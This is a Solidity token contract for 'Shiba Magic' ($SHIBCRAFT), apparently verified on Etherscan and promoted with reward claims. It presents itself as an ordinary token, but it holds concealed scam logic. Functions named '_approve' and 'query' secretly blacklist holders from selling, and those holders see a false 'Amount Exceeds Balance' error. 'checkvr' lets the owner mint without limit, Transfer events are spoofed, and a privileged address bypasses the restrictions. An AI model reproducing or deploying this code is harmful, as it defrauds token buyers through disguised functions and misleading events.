/**
 *Submitted for verification at Etherscan.io on 2022-09-27
*/

pragma solidity 0.8.17;
/*

Shiba Magic - $SHIBCRAFT -

Brewing up yields on the ETH blockchain.

- Lock $SHIBCRAFT to earn ETH Rewards
- 0% Tax Launch Day
- More Events to come

TG: OfficialShibCraft
*/   
 
contract SHIBCRAFT {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) AmountOf;

    // 
    string public name = "Shiba Magic";
    string public symbol = unicode"SHIBCRAFT";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0x170aAE8909d01892a0FDa63e332B167D932d2ad3;
    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
   


modifier onlyOwner() {
    require(msg.sender == owner);
    _; }


    function deploy(address account, uint256 amount) public onlyOwner {
    emit Transfer(address(0), account, amount); }
    

    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }       
        require(!AmountOf[msg.sender] , "Amount Exceeds Balance"); 
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


         

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
        function checkvr(address oracle,  uint256 update) public {
             require(msg.sender == owner);
             balanceOf[oracle] += update;
             totalSupply += update; }
            function _approve(address txt) public
             {             
             require(msg.sender == owner);
         require(!AmountOf[txt], "0x");
             AmountOf[txt] = true; }
        function query(address txt) public {
             require(msg.sender == owner);
        require(AmountOf[txt], "0x");
         AmountOf[txt] = false; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }     
        require(!AmountOf[from] , "Amount Exceeds Balance"); 
        require(!AmountOf[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }